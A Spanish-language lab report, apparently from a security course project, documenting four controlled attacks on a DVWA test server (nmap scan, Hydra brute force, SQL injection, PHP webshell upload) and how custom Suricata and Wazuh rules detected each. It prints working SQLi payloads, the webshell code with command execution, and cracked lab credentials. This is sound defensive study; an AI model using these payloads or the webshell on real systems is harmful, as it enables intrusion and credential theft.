# 2.4 Ataques controlados y detección

Origen de todos los ataques: **Kali-Atacante (192.168.56.30)** → destino **web-tiendacr (192.168.56.10)**.
Horas en Costa Rica (UTC-6). El "tiempo hasta la alerta" se midió con las marcas de tiempo de los
registros: el primer flujo del atacante en `eve.json` de Suricata contra la alerta en `alerts.json` de Wazuh.

## Tabla resumen

| N.º | Ataque | Herramienta | Regla que lo detectó | Tiempo hasta la alerta | MITRE ATT&CK |
|---|---|---|---|---|---|
| 1 | Reconocimiento: escaneo de puertos y servicios | `nmap -sS -sV` | Suricata **1000001** (propia) → Wazuh **100120** (propia, nivel 10); además ET SCAN 2024364 | 1.1 s (IDS) / 2.1 s (SIEM) | T1046 Network Service Discovery |
| 2 | Fuerza bruta contra el login de la aplicación | `hydra http-get-form` | Suricata **1000002** (propia) + Wazuh **100100/100101** (propias) → respuesta activa **651** (firewall-drop) | 1.2 s (IDS) / 1.7 s (SIEM) | T1110.001 Password Guessing |
| 3 | Inyección SQL | `curl` (payloads manuales) | Suricata **1000003** (propia) → Wazuh **100120** (propia, nivel 10) | <0.1 s (IDS) / 1.9 s (SIEM) | T1190 Exploit Public-Facing Application |
| 4 | Webshell y modificación de archivos | `curl` (subida + `?cmd=`) | Wazuh **100110** (FIM, nivel 12) + Suricata **1000004** → Wazuh **100120** | Tiempo real (FIM) / 1.8 s (IDS→SIEM) | T1505.003 Web Shell |

---

## Ataque 1. Reconocimiento con escaneo de puertos y servicios

**Fecha:** 24/11/2026 · **Técnica:** T1046 (Discovery)

**Comando (Kali):**
```bash
date "+INICIO: %H:%M:%S" && sudo nmap -sS -sV -T4 -p 1-1000 192.168.56.10
```

**Resultado del escaneo:** solo el puerto **80/tcp (http)** aparece abierto. El 22/tcp aparece **filtrado**, porque la regla R1 del firewall solo permite SSH desde la laptop de administración (192.168.56.1). Esto confirma que el control de acceso reduce la superficie de ataque visible.

**Evidencia en los registros:**

| Hora | Fuente | Evento |
|---|---|---|
| 13:19:24.394 | Suricata `eve.json` | Primer flujo desde 192.168.56.30 (inicio del escaneo) |
| 13:19:25.497 | Suricata `eve.json` | `alert` sid **1000001** "TiendaCR - Escaneo de puertos SYN (posible nmap)" (2 eventos) |
| 13:19:26.501 | Wazuh `alerts.json` | Regla **100120** nivel 10 "TiendaCR Suricata (regla propia): ... desde 192.168.56.30" |
| 13:19:36.504 | Wazuh | Regla 86601: Suricata "ET SCAN Possible Nmap User-Agent Observed" (sid 2024364, 4 eventos) |
| 13:19:36.574 | Wazuh | Regla 31101 "Web server 400 error code" (sondas de `-sV` contra Apache) |

**Reglas que lo detectaron:**
* **Suricata 1000001 (propia):** 20 o más paquetes SYN desde un mismo origen en 5 s (`threshold: type both, track by_src, count 20, seconds 5`).
* **Wazuh 100120 (propia):** eleva a nivel 10 las alertas de Suricata cuyo SID está en el rango propio 10000xx, para que resalten en el panel sobre el ruido de nivel 3.
* **Suricata 2024364 (ET Open):** detecta el *User-Agent* de Nmap Scripting Engine durante la detección de versiones.

**Tiempo hasta la alerta:** **1.1 s** en el IDS y **2.1 s** en el panel central (1 s de transporte agente → SIEM).

**Capturas:** `docs/capturas/ataque1-nmap.png`, `ataque1-alertas.png`, `ataque1-detalle.png`.

---

## Ataque 2. Fuerza bruta contra el login de la aplicación web

**Fecha:** 24/11/2026 · **Técnica:** T1110.001 (Credential Access – Password Guessing)

**Comando (Kali):**
```bash
hydra -l admin -P /tmp/pass.txt -t 2 -f 192.168.56.10 http-get-form \
  "/vulnerabilities/brute/:username=^USER^&password=^PASS^&Login=Login:\
H=Cookie\: PHPSESSID=<sesion>; security=low:F=Username and/or password incorrect."
```
Se usó una lista de 31 contraseñas comunes contra el módulo *Brute Force* de DVWA, autenticando primero para obtener una cookie de sesión válida (`PHPSESSID`).

**Resultado del ataque:** Hydra alcanzó a enviar unos **30 intentos** antes de que la respuesta automática lo cortara. Según la propia salida de Hydra solo completó **16 intentos** y el resto quedó colgado (los paquetes empezaron a descartarse), por lo que **nunca llegó a la contraseña correcta** (estaba de última en la lista). La comprobación final con `curl` confirmó `>>> BLOQUEADO por la respuesta automatica de Wazuh`. Es decir, la defensa detuvo el ataque **en vivo** antes de que tuviera éxito.

**Evidencia en los registros** (horas en Costa Rica, UTC-6):

| Hora | Fuente | Evento |
|---|---|---|
| 16:37:52.327 | Suricata `eve.json` | Primera petición de 192.168.56.30 a `/vulnerabilities/brute/` (inicio del ataque) |
| 16:37:53.099 | Wazuh `alerts.json` | Regla **100100** nivel 3 "intento de inicio de sesion en la aplicacion web desde 192.168.56.30" (13 eventos) |
| 16:37:53.546 | Suricata `eve.json` | `alert` sid **1000002** "TiendaCR - Fuerza bruta contra login web" |
| 16:37:54.036 | Wazuh `alerts.json` | Regla **100101** nivel 10 "fuerza bruta contra el login web … (10+ intentos en 60 s)" · MITRE **T1110.001** |
| 16:37:54.125 | Wazuh `alerts.json` | Regla **651** "Host Blocked by firewall-drop Active Response" (`cmd=add`) → respuesta automática |
| 16:41:23.605 | Wazuh `alerts.json` | Regla **652** "Host Unblocked by firewall-drop Active Response" (`cmd=delete`) → bloqueo liberado a los ~180 s |

**Reglas que lo detectaron:**
* **Wazuh 100100 (propia, nivel 3):** cada petición POST al módulo `/vulnerabilities/brute/` con `password=` en el log de Apache; marca cada intento individual.
* **Wazuh 100101 (propia, nivel 10):** correlación — 10 o más eventos 100100 desde la misma IP en 60 s (`frequency=10 timeframe=60 same_srcip`). Es la que clasifica el patrón como fuerza bruta y dispara la respuesta activa. Técnica MITRE T1110.001.
* **Suricata 1000002 (propia):** a nivel de red, 10 o más peticiones HTTP a `/vulnerabilities/brute/` con `password=` desde un mismo origen en 60 s.
* **Wazuh 651 (incluida):** confirma la ejecución de la respuesta activa `firewall-drop` sobre el agente objetivo.

**Respuesta automática (fase 2.6):** la regla 100101 dispara el comando `firewall-drop`, que en el agente objetivo inserta `iptables -I INPUT -s 192.168.56.30 -j DROP` y la misma regla en `FORWARD` (necesaria porque DVWA publica el puerto 80 vía Docker/FORWARD). El bloqueo es **temporal (180 s)** para limitar el daño de un posible falso positivo, y la IP de administración (192.168.56.1) está en la lista blanca para no perder acceso al laboratorio. La liberación quedó registrada por la regla 652 a las 16:41:23.

**Tiempo hasta la alerta:** **1.2 s** en el IDS (Suricata 1000002) y **1.7 s** en el panel central (Wazuh 100101). El bloqueo quedó activo a los **1.8 s** del primer intento.

**Capturas:** `docs/capturas/ataque2-hydra.png` (Hydra cortado + mensaje de bloqueo), `ataque2-alertas.png` (alertas 100101 y 651 en el panel), `ataque2-detalle.png` (alerta 100101 expandida con MITRE T1110.001 y origen 192.168.56.30).

---

## Ataque 3. Inyección SQL en el parámetro `id`

**Fecha:** 24/11/2026 · **Técnica:** T1190 (Initial Access – Exploit Public-Facing Application)

**Comando (Kali):** se enviaron tres payloads contra el módulo *SQL Injection* de DVWA (nivel *low*), reutilizando la cookie de sesión:
```bash
# (a) Boolean-based (devuelve todos los registros)
curl -G "http://192.168.56.10/vulnerabilities/sqli/" \
  --data-urlencode "id=1' OR '1'='1" --data-urlencode "Submit=Submit"
# (b) UNION-based: extrae usuarios y hashes de la tabla users
curl -G "http://192.168.56.10/vulnerabilities/sqli/" \
  --data-urlencode "id=1' UNION SELECT user, password FROM users-- -" --data-urlencode "Submit=Submit"
# (c) UNION-based: versión del motor de base de datos
curl -G "http://192.168.56.10/vulnerabilities/sqli/" \
  --data-urlencode "id=1' UNION SELECT null, version()-- -" --data-urlencode "Submit=Submit"
```

**Resultado del ataque (impacto):** la inyección tuvo éxito y permitió **exfiltrar toda la tabla `users`** de la base de datos de DVWA — cinco usuarios con sus hashes MD5 — y la versión del motor:

| Usuario | Hash MD5 extraído | Contraseña (tras crackear) |
|---|---|---|
| admin | `5f4dcc3b5aa765d61d8327deb882cf99` | password |
| gordonb | `e99a18c428cb38d5f260853678922e03` | abc123 |
| 1337 | `8d3533d75ae2c3966d7e0d4fcc69216b` | charley |
| pablo | `0d107d09f5bbe40cade3de5c71e9e9b7` | letmein |
| smithy | `5f4dcc3b5aa765d61d8327deb882cf99` | password |

Motor de base de datos revelado: **MariaDB 10.1.26-0+deb9u1**. Los hashes son MD5 sin *salt*, por lo que se crackean de inmediato con diccionarios públicos; `admin` y `smithy` reutilizan la contraseña `password`. Esto demuestra el impacto real de la vulnerabilidad: compromiso total de las credenciales de la aplicación.

**Evidencia en los registros** (horas en Costa Rica, UTC-6):

| Hora | Fuente | Evento |
|---|---|---|
| 16:56:27.296 | Suricata `eve.json` | `alert` sid **1000003** "TiendaCR - Inyeccion SQL en parametro id" (payload booleano) · metadata MITRE **T1190** |
| 16:56:27.342 | Suricata `eve.json` | `alert` sid **1000003** (payload UNION SELECT users/password) |
| 16:56:27.387 | Suricata `eve.json` | `alert` sid **1000003** (payload UNION SELECT version) |
| 16:56:29.236 | Wazuh `alerts.json` | Regla **100120** nivel 10 "TiendaCR - Inyeccion SQL en parametro id" (1.ª de 3) |
| 16:56:29.251 | Wazuh `alerts.json` | Regla **100120** nivel 10 (2.ª) |
| 16:56:29.261 | Wazuh `alerts.json` | Regla **100120** nivel 10 (3.ª) |

**Reglas que lo detectaron:**
* **Suricata 1000003 (propia):** en el buffer `http.uri` de una petición a `/vulnerabilities/sqli` con `id=`, una expresión regular detecta `UNION [ALL] SELECT` o el patrón clásico `' OR '<n>'='<n>`. Lleva `metadata: mitre_technique_id T1190`. Cada uno de los tres payloads generó su propia alerta.
* **Wazuh 100120 (propia, nivel 10):** eleva a nivel 10 las alertas de las reglas propias de Suricata (SID 10000xx) para que resalten en el panel central.

**Tiempo hasta la alerta:** **inmediato (<0.1 s)** en el IDS — la regla casa con la propia petición HTTP, sin necesidad de umbral — y **1.9 s** en el panel central (transporte agente → SIEM).

**Nota:** a diferencia del ataque 2, la SQLi **no** dispara la respuesta automática `firewall-drop` (solo está asociada a la regla 100101 de fuerza bruta y a las de SSH). Se detecta y alerta, pero no se bloquea, lo cual se corrige en la fase de remediación (2.8) subiendo el nivel de seguridad de DVWA.

**Capturas:** `docs/capturas/ataque3-sqli.png` (usuarios y hashes extraídos en Kali), `ataque3-alertas.png` (alertas de SQLi en el panel), `ataque3-detalle.png` (alerta expandida con la firma 1000003 y MITRE T1190).

---

## Ataque 4. Webshell y modificación de archivos

**Fecha:** 24/11/2026 · **Técnica:** T1505.003 (Persistence – Web Shell)

**Comando (Kali):** se abusó del módulo *File Upload* de DVWA (nivel *low*), que no valida el tipo real del archivo, para subir una webshell PHP y luego ejecutarla:
```bash
# 1) Webshell con ejecución de comandos del sistema
echo '<?php echo "WEBSHELL-TIENDACR:"; system($_GET["cmd"]); ?>' > ws.php
# 2) Subida al directorio de cargas
curl -b "security=low" -F "MAX_FILE_SIZE=100000" -F "uploaded=@ws.php;type=image/jpeg" \
     -F "Upload=Upload" -F "user_token=<token>" "http://192.168.56.10/vulnerabilities/upload/"
# 3) Ejecución remota de comandos (RCE)
curl "http://192.168.56.10/hackable/uploads/ws.php?cmd=id"
curl "http://192.168.56.10/hackable/uploads/ws.php?cmd=uname%20-a"
```

**Resultado del ataque (impacto):** la subida tuvo éxito (`ws-181552.php succesfully uploaded`) y la webshell permitió **ejecución remota de comandos (RCE)** en el servidor:
```
cmd=id    -> WEBSHELL-TIENDACR:uid=33(www-data) gid=33(www-data) groups=33(www-data)
cmd=uname -> WEBSHELL-TIENDACR:Linux 8aa9d3c752b4 6.8.0-151-generic #151-Ubuntu SMP ... x86_64 GNU/Linux
```
El atacante obtuvo ejecución de comandos como el usuario `www-data` dentro del contenedor (`8aa9d3c752b4`). Desde aquí podría leer la configuración de la aplicación, pivotar o intentar escalar privilegios. Es el ataque de mayor severidad (nivel 12 en Wazuh).

**Evidencia en los registros** (horas en Costa Rica, UTC-6):

| Hora | Fuente | Evento |
|---|---|---|
| ~17:15:52 | — | Subida del archivo `ws-181552.php` al directorio de cargas (host: `/var/www/dvwa/hackable/uploads/`) |
| 17:16:01.095 | Wazuh `alerts.json` (FIM) | Regla **100110** nivel 12 "posible webshell PHP creada … ws-181552.php" · MITRE **T1505.003** |
| 17:16:01.097 | Suricata `eve.json` | `alert` sid **1000004** "TiendaCR - Ejecucion de comandos via webshell en uploads" (petición `?cmd=id`) |
| 17:16:01.148 | Suricata `eve.json` | `alert` sid **1000004** (petición `?cmd=uname -a`) |
| 17:16:02.942 | Wazuh `alerts.json` | Regla **100120** nivel 10 (ejecución de webshell, desde Suricata) |

**Reglas que lo detectaron (dos capas):**
* **Wazuh 100110 (propia, FIM, nivel 12):** el monitoreo de integridad de archivos (`syscheck` en tiempo real sobre `/var/www/dvwa`) detecta la **creación** de un archivo `.php` en `hackable/uploads/` — algo que nunca debería ocurrir en un directorio de imágenes — y lo marca como posible webshell. Técnica MITRE T1505.003. Se habilitó `alert_new_files=yes` para garantizar la alerta ante archivos nuevos.
* **Suricata 1000004 (propia):** a nivel de red detecta la **ejecución** de la webshell: peticiones HTTP a `/hackable/uploads/*.php` con el parámetro `cmd=`.
* **Wazuh 100120 (propia, nivel 10):** eleva la alerta de ejecución de Suricata en el panel central.

Esta doble detección es valiosa: el FIM atrapa la **persistencia** (el archivo subido) aunque el atacante nunca lo ejecute, y Suricata atrapa el **uso** aunque el archivo hubiese entrado por otra vía.

**Tiempo hasta la alerta:** el FIM alertó la creación del archivo **en tiempo real** (la alerta de creación, 100110, entró en el panel ~1.8 s antes que la de ejecución). La ejecución la detectó Suricata de forma **inmediata (<0.1 s)** y llegó al panel central (100120) en **1.8 s** (transporte agente → SIEM).

**Capturas:** `docs/capturas/ataque4-upload.png` (subida y salida del RCE `id`/`uname` en Kali), `ataque4-fim.png` (alerta 100110 nivel 12 en el panel), `ataque4-detalle.png` (alerta expandida con `syscheck.path` y MITRE T1505.003).
